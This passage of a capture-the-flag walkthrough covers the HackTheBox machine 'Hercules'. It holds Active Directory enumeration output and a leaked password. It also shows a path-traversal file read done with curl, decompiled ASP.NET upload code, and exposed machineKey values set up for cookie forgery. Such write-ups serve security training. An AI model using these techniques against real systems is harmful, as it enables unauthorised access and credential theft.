SMB         dc.hercules.htb 445    dc               zeke.s                        2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               adriana.i                     2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               tish.c                        2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               jennifer.a                    2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               shae.j                        2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               joel.c                        2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               jacob.b                       2024-12-04 01:44:47 0        
SMB         dc.hercules.htb 445    dc               web_admin                     2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               bob.w                         2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               ken.w                         2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               johnathan.j                   2024-12-04 01:44:48 0       change*th1s_p@ssw()rd!! 
SMB         dc.hercules.htb 445    dc               harris.d                      2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               ray.n                         2024-12-04 01:44:48 0        
SMB         dc.hercules.htb 445    dc               natalie.a                     2026-09-15 18:46:14 0        
SMB         dc.hercules.htb 445    dc               ramona.l                      2024-12-04 01:44:49 0        
SMB         dc.hercules.htb 445    dc               fiona.c                       2024-12-04 01:44:49 0        
SMB         dc.hercules.htb 445    dc               patrick.s                     2024-12-04 01:44:49 0        
SMB         dc.hercules.htb 445    dc               tanya.r                       2024-12-04 01:44:49 0        
SMB         dc.hercules.htb 445    dc               Admin                         2025-10-17 12:26:46 0        
SMB         dc.hercules.htb 445    dc               [*] Enumerated 42 local users: HERCULES
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

The output includes the LDAP comment with the password. It also includes four accounts my brute force never turned up, Admin, Administrator, Guest, and krbtgt. That fits, as the brute force [above](#username-script) only found users who can log into the site.

#### LDAP - TCP 389

I’ll use `netexec` to check for interesting stuff. There are no gMSA accounts and no Kerberoastable users:

```css
oxdf@hacky$ netexec ldap dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --gmsa
LDAP        dc.hercules.htb 389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc.hercules.htb 389    DC               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
LDAP        dc.hercules.htb 389    DC               [*] Getting GMSA Passwords
oxdf@hacky$ netexec ldap dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --kerberoasting kerberoasting.txt
LDAP        dc.hercules.htb 389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc.hercules.htb 389    DC               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
LDAP        dc.hercules.htb 389    DC               [*] Skipping disabled account: krbtgt
LDAP        dc.hercules.htb 389    DC               [*] Total of records returned 0
```

The Machine Account Quota is set to 0:

```css
oxdf@hacky$ netexec ldap dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k -M maq
LDAP        dc.hercules.htb 389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        dc.hercules.htb 389    DC               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
MAQ         dc.hercules.htb 389    DC               [*] Getting the MachineAccountQuota
MAQ         dc.hercules.htb 389    DC               MachineAccountQuota: 0
```

I’ll collect BloodHound as well with `rusthound-ce`:

```css
oxdf@hacky$ rusthound-ce -d hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' --zip
---------------------------------------------------
Initializing RustHound-CE at 18:59:32 on 09/15/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-09-15T18:59:33Z INFO  rusthound_ce] Verbosity level: Info
[2026-09-15T18:59:33Z INFO  rusthound_ce] Collection method: All
[2026-09-15T18:59:33Z INFO  rusthound_ce::ldap] Connected to HERCULES.HTB Active Directory!
[2026-09-15T18:59:33Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-09-15T18:59:33Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-15T18:59:34Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=hercules,DC=htb
[2026-09-15T18:59:34Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-15T18:59:35Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=hercules,DC=htb
[2026-09-15T18:59:35Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-15T18:59:36Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=hercules,DC=htb
[2026-09-15T18:59:36Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-15T18:59:36Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=hercules,DC=htb
[2026-09-15T18:59:36Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-09-15T18:59:36Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=hercules,DC=htb
[2026-09-15T18:59:36Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⠈ Parsing LDAP objects: 43%                                                                                                            
[2026-09-15T18:59:36Z INFO  rusthound_ce::objects::enterpriseca] Found 18 enabled certificate templates
[2026-09-15T18:59:36Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 49 users parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 9 ous parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-09-15T18:59:36Z INFO  rusthound_ce::json::maker::common] .//20260915185936_hercules-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 18:59:36 on 09/15/26! Happy Graphing!
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

I’ll upload this into the BloodHound-CE docker container and mark ken.w as owned. This user doesn’t have any outbound control other than what all Domain Users have:

![image-20260915173840720](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f7da6c3553ba20d4.png)

![image-20260915173840720](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915173840720.webp)

ADCS is running, with a CA named CA-HERCULES@HERCULES.HTB.

I’ll also note the Remote Management Users group, as accounts that are worth looking out for to get a shell:

![image-20260917075658859](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bb9f47d5248f9275.png)

![image-20260917075658859](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260917075658859.webp)

#### Web

These creds do work to log into the portal:

![⚠️ 图片托管失败 · image-20260915124237987](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915124237987.png)

![image-20260915124237987](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915124237987.webp)

“Mail” shows three messages:

![image-20260915124336555](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/761d330d1679eff6.png)

![image-20260915124336555](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915124336555.webp)

Site Maintenance says that the website is now fully using domain auth:

![image-20260915124325715](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/003d182e11370983.png)

![image-20260915124325715](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915124325715.webp)

“IMPORTANT!!!” is a note from the admin saying that this account has been hacked:

![image-20260915124413344](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/db59427879a6f002.png)

![image-20260915124413344](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915124413344.webp)

The domain actually is different from this one, and uses HTTP rather than HTTPS. I can’t find a `/ChangePassword` page on either `hadess.htb` or `hercules.htb`.

“From the Boss” has another link:

![image-20260915131737106](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/555ce95ccff06a4c.png)

![image-20260915131737106](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915131737106.webp)

I’m not able to find this zip either.

The “Downloads” tab has three forms:

![image-20260915134919920](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d3ec2d5ed02e4a69.png)

![image-20260915134919920](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915134919920.webp)

The only interesting thing is in the second where it leaks the name Bob Wood and `BWood@hades.htb`.

Under “Security” it has two options, but both just show an error message saying they don’t work when “Add” is clicked:

![image-20260915135043166](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e72db7febcc1c97a.png)

![image-20260915135043166](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915135043166.webp)

The last two bits are forms. “Account Details” gives the opportunity to update the user’s name and password:

![image-20260915135837108](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/57e4d7f86ce50119.png)

![image-20260915135837108](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915135837108.webp)

Trying to fill this out just returns another message saying to contact support.

The last tab is “Forms”, which has a “Report Submission” function:

![image-20260915140054916](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/da9d282a90110cdd.png)

![image-20260915140054916](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915140054916.webp)

Submitting without an attachment works:

![image-20260915140414489](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/a197dca15f013cd6.png)

![image-20260915140414489](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915140414489.webp)

Including any file ends in failure:

![image-20260915140522203](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5ac5124feb9ce2f4.png)

![image-20260915140522203](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915140522203.webp)

### Web Admin Access

#### File Read POC

I’ll notice that when I download the PDFs from the “Downloads” page, it generates an HTTP request that looks like:

```
GET /Home/Download?fileName=registration.pdf HTTP/2
Host: hercules.htb
Cookie: __RequestVerificationToken=b2B95vDD1qkNrAkmBfKGsUOjwHsnbrFrothGIZHq8jgojxF3CrWCFfGLHVxvYyCGS0CWPwDQMJ_z49-VudbqnFPVkMxb0UOw5esIUSjqr6I1; .ASPXAUTH=205F59C3C078FAF9C14704A4CC53224D0AC3543A2022C05CD1B18E3FC7106126EC32CFF5AE8A5BFECC9FB3FE2459E958E2F3579089931B676C06C9C7A221D1CE0F0C48D166191780F588BD26E5EC0BEE8BCFCF8A56AC1EF5975D796CC6FA6D8E4EF4F20498ECD5802B3F900326EF0D3C7D738C367EB61417843B02FFB80627EF142D35A8BC9D37B932878655D9E521156B42AFDE3771140FB44DA99D1DDA02AB
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://hercules.htb/Home/Downloads


```

This is a good place to check for directory traversal / arbitrary file read. I’ll send the request to Burp Repeater, and try adding `../` to the `fileName` parameter. After poking around at this for a bit, I’ll find a `web.config` file:

![image-20260915175756009](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/aa768b435795f75a.png)

![image-20260915175756009](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915175756009.webp)

#### Other Files

In this kind of app, I can look for a `Global.asax` in the same directory as the `web.config`, but it’s not there. That’s because it’s a precompiled application. I can get the `PrecompiledApp.config`:

```xml
<precompiledApp version="2" updatable="true"/>
```

In the `Views` directory, there is another `web.config`:

```xml
<?xml version="1.0"?>

<configuration>
  <configSections>
    <sectionGroup name="system.web.webPages.razor" type="System.Web.WebPages.Razor.Configuration.RazorWebSectionGroup, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35">
      <section name="host" type="System.Web.WebPages.Razor.Configuration.HostSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" requirePermission="false" />
      <section name="pages" type="System.Web.WebPages.Razor.Configuration.RazorPagesSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" requirePermission="false" />
    </sectionGroup>
  </configSections>

  <system.web.webPages.razor>
    <host factoryType="System.Web.Mvc.MvcWebRazorHostFactory, System.Web.Mvc, Version=5.2.7.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
    <pages pageBaseType="System.Web.Mvc.WebViewPage">
      <namespaces>
        <add namespace="System.Web.Mvc" />
        <add namespace="System.Web.Mvc.Ajax" />
        <add namespace="System.Web.Mvc.Html" />
        <add namespace="System.Web.Routing" />
        <add namespace="HadesWeb" />
      </namespaces>
    </pages>
  </system.web.webPages.razor>

  <appSettings>
    <add key="webpages:Enabled" value="false" />
  </appSettings>

  <system.webServer>
    <handlers>
      <remove name="BlockViewHandler"/>
      <add name="BlockViewHandler" path="*" verb="*" preCondition="integratedMode" type="System.Web.HttpNotFoundHandler" />
    </handlers>
  </system.webServer>

  <system.web>
    <compilation>
      <assemblies>
        <add assembly="System.Web.Mvc, Version=5.2.7.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      </assemblies>
    </compilation>
  </system.web>
</configuration>
```

In this file, it adds a bunch of namespaces:

```html
      <namespaces>
        <add namespace="System.Web.Mvc" />
        <add namespace="System.Web.Mvc.Ajax" />
        <add namespace="System.Web.Mvc.Html" />
        <add namespace="System.Web.Routing" />
        <add namespace="HadesWeb" />
      </namespaces>
```

`HadesWeb` will be the name of the `.dll` file:

![image-20260915225023802](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9b472f9858aab954.png)

![image-20260915225023802](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915225023802.webp)

I’ll grab a copy:

```typescript
oxdf@hacky$ curl --path-as-is -k -s -H 'Host: hercules.htb' -b '__RequestVerificationToken=b2B95vDD1qkNrAkmBfKGsUOjwHsnbrFrothGIZHq8jgojxF3CrWCFfGLHVxvYyCGS0CWPwDQMJ_z49-VudbqnFPVkMxb0UOw5esIUSjqr6I1; .ASPXAUTH=72C0A32C8476058764FEDD0C90D73CD15B729D19D2B7561C09E24BA4350E961FE8D2ED7E771455B547ECA6F8B60BA51EC25F7484A6FB954A3B5F8FDEE7F97C2A165127B17762AD1735B6A96BEF5A5F88CDDDC0C0F62DDCF62533B9F505FBF3208B392169933DF2A686712986A31520B86E1F52B04E0CF6558089F937F504D87AB292C150D6E19C2BBE59E24CAFF11FF7A6597DDDDD23D83204C0F877CD74DCE3' 'https://hercules.htb/Home/Download?fileName=../../bin/HadesWeb.dll' -o HadesWeb.dll
oxdf@hacky$ file HadesWeb.dll 
HadesWeb.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

#### HadesWeb.dll

It’s not necessary to find and reverse the DLL, but it makes it so I don’t have to guess later. I’ll open the binary in [DotPeek](https://www.jetbrains.com/decompiler/) and take a look. There are three namespaces, `HadesWeb`, `HadesWeb.Controllers`, and `HadesWeb.Models`:

![image-20260915230110646](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/742502ddce5b2451.png)

![image-20260915230110646](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260915230110646.webp)

`MvcApplication` holds the `Application_AuthenticateRequest` handler, which is the precompiled stand-in for the `Global.asax` that wasn’t on disk. That’s the code that turns the forms ticket into a user with roles, which will matter later.

The part that will prove interesting is the Form upload function, which is found in the `HomeController` class in `HadesWeb.Controllers`:

```cs
[HttpPost]
[ValidateAntiForgeryToken]
[RateLimit]
public ActionResult Forms(UploadFormModel model)
{
  if (this.ModelState.IsValid)
  {
    if (model.UploadedFile != null && model.UploadedFile.ContentLength > 0)
    {
      if (this.User.IsInRole("Web Administrators"))
      {
        int num = 1048576;
        if (model.UploadedFile.ContentLength < num)
        {
          string[] source = new string[2]
          {
            ".docx",
            ".odt"
          };
          string lower = Path.GetExtension(model.UploadedFile.FileName).ToLower();
          if (((IEnumerable<string>) source).Contains<string>(lower))
          {
            try
            {
              string filename = Path.Combine("C:\\inetpub\\Reports\\", Path.GetFileName(string.Format("{0}{1}", (object) Guid.NewGuid(), (object) lower)));
              model.UploadedFile.SaveAs(filename);
              // ISSUE: reference to a compiler-generated field
              if (HomeController.\u003C\u003Eo__8.\u003C\u003Ep__0 == null)
              {
                // ISSUE: reference to a compiler-generated field
                HomeController.\u003C\u003Eo__8.\u003C\u003Ep__0 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.SetMember(CSharpBinderFlags.None, "Success", typeof (HomeController), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
                {
                  CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
                  CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
                }));
              }
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              object obj = HomeController.\u003C\u003Eo__8.\u003C\u003Ep__0.Target((CallSite) HomeController.\u003C\u003Eo__8.\u003C\u003Ep__0, ((ControllerBase) this).ViewBag, "Thank you for your report!");
            }
            catch (Exception ex)
            {
            }
          }
          else
          {
            // ISSUE: reference to a compiler-generated field
            if (HomeController.\u003C\u003Eo__8.\u003C\u003Ep__1 == null)
            {
              // ISSUE: reference to a compiler-generated field
              HomeController.\u003C\u003Eo__8.\u003C\u003Ep__1 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.SetMember(CSharpBinderFlags.None, "Message", typeof (HomeController), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
              {
                CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
                CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
              }));
            }
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            object obj = HomeController.\u003C\u003Eo__8.\u003C\u003Ep__1.Target((CallSite) HomeController.\u003C\u003Eo__8.\u003C\u003Ep__1, ((ControllerBase) this).ViewBag, "File type is not supported.");
          }
        }
        else
        {
          // ISSUE: reference to a compiler-generated field
          if (HomeController.\u003C\u003Eo__8.\u003C\u003Ep__2 == null)
          {
            // ISSUE: reference to a compiler-generated field
            HomeController.\u003C\u003Eo__8.\u003C\u003Ep__2 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.SetMember(CSharpBinderFlags.None, "Message", typeof (HomeController), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
            {
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
              CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
            }));
          }
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          object obj = HomeController.\u003C\u003Eo__8.\u003C\u003Ep__2.Target((CallSite) HomeController.\u003C\u003Eo__8.\u003C\u003Ep__2, ((ControllerBase) this).ViewBag, "File too large.");
        }
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        if (HomeController.\u003C\u003Eo__8.\u003C\u003Ep__3 == null)
        {
          // ISSUE: reference to a compiler-generated field
          HomeController.\u003C\u003Eo__8.\u003C\u003Ep__3 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.SetMember(CSharpBinderFlags.None, "Message", typeof (HomeController), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object obj = HomeController.\u003C\u003Eo__8.\u003C\u003Ep__3.Target((CallSite) HomeController.\u003C\u003Eo__8.\u003C\u003Ep__3, ((ControllerBase) this).ViewBag, "File Upload not permitted.");
      }
    }
    else
    {
      // ISSUE: reference to a compiler-generated field
      if (HomeController.\u003C\u003Eo__8.\u003C\u003Ep__4 == null)
      {
        // ISSUE: reference to a compiler-generated field
        HomeController.\u003C\u003Eo__8.\u003C\u003Ep__4 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.SetMember(CSharpBinderFlags.None, "Success", typeof (HomeController), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      object obj = HomeController.\u003C\u003Eo__8.\u003C\u003Ep__4.Target((CallSite) HomeController.\u003C\u003Eo__8.\u003C\u003Ep__4, ((ControllerBase) this).ViewBag, "Thank you for your report!");
    }
  }
  this.ClearEntries<UploadFormModel>(model);
  return (ActionResult) this.View((object) model);
}
```

To upload, the user must be in the “Web Administrators” role, the content length must be less than 1048576 (1MB), and it must end in `.docx` or `.odt`. The file is saved into `C:\inetpub\Reports\`, which is the `Reports` share from the SMB enumeration, under a new GUID name with the same extension.

This can also be found in the strings in the binary (though with much less context):

```
oxdf@hacky$ strings -el HadesWeb.dll | grep -i admin
Web Administrators
```

I can also see the directory traversal in the next function in the same class:

```kotlin
    public ActionResult Download(string fileName)
    {
      try
      {
        return (ActionResult) this.File(this.Server.MapPath("~/App_Data/Downloads/" + fileName), MimeMapping.GetMimeMapping(fileName), fileName);
      }
      catch (Exception ex)
      {
        return (ActionResult) new HttpStatusCodeResult(HttpStatusCode.InternalServerError);
      }
    }
```

There are no other obvious vulnerabilities to go after in this web application.

#### web.config

The `web.config` has configuration information about the application:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  https://go.microsoft.com/fwlink/?LinkId=301880
  -->
<configuration>
  <appSettings>
    <add key="webpages:Version" value="3.0.0.0" />
    <add key="webpages:Enabled" value="false" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.8.1" />
      </system.Web>
  -->
  <system.web>
    <compilation targetFramework="4.8" />
    <authentication mode="Forms">
      <forms protection="All" loginUrl="/Login" path="/" />
    </authentication>
    <httpRuntime enableVersionHeader="false" maxRequestLength="2048" executionTimeout="3600" />
    <machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
    <customErrors mode="Off" />
  </system.web>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Helpers" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.WebPages" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-5.3.0.0" newVersion="5.3.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="Microsoft.Web.Infrastructure" publicKeyToken="31bf3856ad364e35" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-2.0.0.0" newVersion="2.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <remove name="X-AspNetMvc-Version" />
        <remove name="X-Powered-By" />
        <add name="Connection" value="keep-alive" />
      </customHeaders>
    </httpProtocol>
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="2097152" />
      </requestFiltering>
    </security>
    <rewrite>
      <rules>
        <rule name="HTTPS Redirect" stopProcessing="true">
          <match url="(.*)" />
          <conditions>
            <add input="{HTTPS}" pattern="^OFF$" />
          </conditions>
          <action type="Redirect" url="https://{HTTP_HOST}{REQUEST_URI}" redirectType="Permanent" />
        </rule>
      </rules>
    </rewrite>
    <httpErrors errorMode="Custom" existingResponse="PassThrough">
      <remove statusCode="404" subStatusCode="-1" />
      <error statusCode="404" path="/Error/Index?statusCode=404" responseMode="ExecuteURL" />
      <remove statusCode="500" subStatusCode="-1" />
      <error statusCode="500" path="/Error/Index?statusCode=500" responseMode="ExecuteURL" />
      <remove statusCode="501" subStatusCode="-1" />
      <error statusCode="501" path="/Error/Index?statusCode=501" responseMode="ExecuteURL" />
      <remove statusCode="503" subStatusCode="-1" />
      <error statusCode="503" path="/Error/Index?statusCode=503" responseMode="ExecuteURL" />
      <remove statusCode="400" subStatusCode="-1" />
      <error statusCode="400" path="/Error/Index?statusCode=400" responseMode="ExecuteURL" />
    </httpErrors>
  </system.webServer>
  <system.codedom>
    <compilers>
      <compiler language="c#;cs;csharp" extension=".cs" warningLevel="4" compilerOptions="/langversion:default /nowarn:1659;1699;1701;612;618" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
      <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" warningLevel="4" compilerOptions="/langversion:default /nowarn:41008,40000,40008 /define:_MYTYPE=\&quot;Web\&quot; /optionInfer+" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
    </compilers>
  </system.codedom>
</configuration>
<!--ProjectGuid: 6648C4C4-2FF2-4FF1-9F3E-1A560E46AA52-->
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

The `forms` tag describes how the app is protected:

```xml
<forms protection="All" loginUrl="/Login" path="/" />
```

“All” means signed and encrypted. The `machineKey` has the encryption details:

```xml
<machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
```

The `decryptionKey` is 64 hex chars (32 bytes), which means it’s AES256. The `validationKey` is 128 hex characters (64 bytes), which implies it’s an HMAC-SHA256 key.

This config also confirms the 404 behavior from [above](#tech-stack). The `httpErrors` block routes 404 to `/Error/Index?statusCode=404`, which is the polished custom page, and `customErrors mode="Off"` is why `/index.` gets the ASP.NET default 404 page rather than a generic error.

#### Cookie Validation

There are a couple different `compatibilityMode` values to check, `Framework20SP1` and `Framework45`. I’m going to guess it’s the latter and try. I’ll start with the `.ASPXAUTH` cookie, which is all hex, and work in a Python REPL:

```python
oxdf@hacky$ uv run --with pycryptodome python
Python 3.13.7 (main, Sep 18 2025, 19:47:49) [Clang 20.1.4 ] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hmac, hashlib
>>> from Crypto.Cipher import AES
>>> from Crypto.Util.Padding import unpad
